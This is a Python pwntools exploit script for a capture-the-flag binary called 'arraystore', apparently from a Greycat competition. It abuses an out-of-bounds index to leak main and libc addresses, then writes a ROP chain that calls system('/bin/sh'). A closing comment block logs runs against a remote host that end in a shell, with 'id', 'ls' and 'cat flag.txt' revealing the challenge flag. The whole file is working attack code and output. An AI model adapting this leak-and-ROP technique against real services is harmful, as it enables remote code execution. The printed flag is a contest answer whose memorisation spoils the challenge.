#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn

BINARY = "arraystore"
LIBC = "/home/nasm/Documents/pwn/greycat/array_store/libc.so.6"
LD = "/home/nasm/Documents/pwn/greycat/array_store/ld-linux-x86-64.so.2"

# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8  = pwn.p8
u8  = pwn.u8

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
source /home/nasm/Downloads/pwndbg/gdbinit.py
b* main
'''.format(**locals())
# b* main+352
# b* main+222
# b* main+442
LEAK_MAIN = (0x398 + 0x38 + 0x10) // 8
LEAK_LIBC = (0x398 + 0x38) // 8
ROP_BASE = (0x398 + 0x38)
STAGE_LIBC_LEAK = 0

import subprocess
def one_gadget(filename):
  return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def exp():

    io = start()

    def write(idx, value):
        """
        write a value relatively to rip saved ptr
        """
        io.sendlineafter(b"Read/Write?: ", b"W")
        io.sendlineafter(b"Index: ", str(~(1 << 63) + idx).encode())
        io.sendlineafter(b"Value: ", str(int.from_bytes(value, byteorder='little')).encode())

    def read(idx):
        """
        read a value relatively to rip saved ptr
        """
        io.sendlineafter(b"Read/Write?: ", b"R")
        io.sendlineafter(b"Index: ", str(~(1 << 63) + idx).encode())
        io.recvuntil(b"Value: ")

    read(LEAK_MAIN)
    exe.address = int(io.recvline().replace(b"\n", b"")) - 0x1090
    pwn.log.success(f"main: {hex(exe.sym.main)}")

    read(LEAK_LIBC)
    libc.address = int(io.recvline().replace(b"\n", b"")) - 0x29d90
    pwn.log.success(f"libc: {hex(libc.address)}")

    rop_exe = pwn.ROP(exe)
    if STAGE_LIBC_LEAK:
        rop_exe.call(rop_exe.find_gadget(["ret"]))
        rop_exe.call('puts', [exe.got.printf])
        rop_exe.call('puts', [exe.got.puts])
        rop_exe.call('puts', [exe.got.strtoll])

        # ret2main
        # rop_exe.call(rop_exe.find_gadget(["ret"]))
        rop_exe.call('system', [b"/bin/sh\x00"])

        for i in range(0, len(rop_exe.chain()), 8):
            write((ROP_BASE + i) // 8, rop_exe.chain()[i:i+8])
        
        io.sendline(b"ptit flop")

        print(io.recvline())

        leak_printf = pwn.unpack(io.recvline().replace(b"\n", b"").ljust(8, b"\x00"))
        pwn.log.success(f"printf: {hex(leak_printf)}")

        leak_puts = pwn.unpack(io.recvline().replace(b"\n", b"").ljust(8, b"\x00"))
        pwn.log.success(f"puts: {hex(leak_puts)}")

        leak_strtoll = pwn.unpack(io.recvline().replace(b"\n", b"").ljust(8, b"\x00"))
        pwn.log.success(f"strtoll: {hex(leak_strtoll)}")

        io.interactive()
    else:
        rop = b"".join([
            pwn.p64(rop_exe.find_gadget(["ret"])[0]),
            pwn.p64(rop_exe.find_gadget(["pop rdi", "ret"])[0]),
            pwn.p64(next(libc.search(b"/bin/sh\x00"))),
            pwn.p64(libc.sym.system)
        ])

        for i in range(0, len(rop), 8):
            write((ROP_BASE + i) // 8, rop[i:i+8])

        io.sendline(b"ptit flop (2)")

        io.interactive()

if __name__ == "__main__":
    exp()

"""
first execution:
nasm@off:~/Documents/pwn/greycat/array_store$ python3 exploit.py REMOTE HOST=34.124.157.94 PORT=10546
[*] '/home/nasm/Documents/pwn/greycat/array_store/arraystore'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/lib64/ld-linux-x86-64.so.2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 34.124.157.94 on port 10546: Done
[+] main: 0x55a852d0b090
[*] Loaded 13 cached gadgets for 'arraystore'
b'Read/Write?: Invalid option\n'
[+] printf: 0x7f2540a77770
[+] puts: 0x7f2540a97ed0
[+] strtoll: 0x7f2540a5e4e0
[*] Switching to interactive mode
Your array has 100 entries
[*] Got EOF while reading in interactive
$  

nasm@off:~/Documents/pwn/greycat/array_store$ python3 exploit.py REMOTE HOST=34.124.157.94 PORT=10546
[*] '/home/nasm/Documents/pwn/greycat/array_store/arraystore'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'/home/nasm/Documents/pwn/greycat/array_store'
[*] '/home/nasm/Documents/pwn/greycat/array_store/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/nasm/Documents/pwn/greycat/array_store/ld-linux-x86-64.so.2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 34.124.157.94 on port 10546: Done
[+] main: 0x55f485e73090
[+] libc: 0x7f3be3e0c000
[*] Loaded 13 cached gadgets for 'arraystore'
[*] Switching to interactive mode
Read/Write?: Invalid option
$ id
uid=1000 gid=1000 groups=1000
$ ls
flag.txt
run
$ cat flag.txt
grey{wh0_s41d_1i5_0n1y_100_3ntr1e5?_9384h948rhfp84e3w9rfh984}$
"""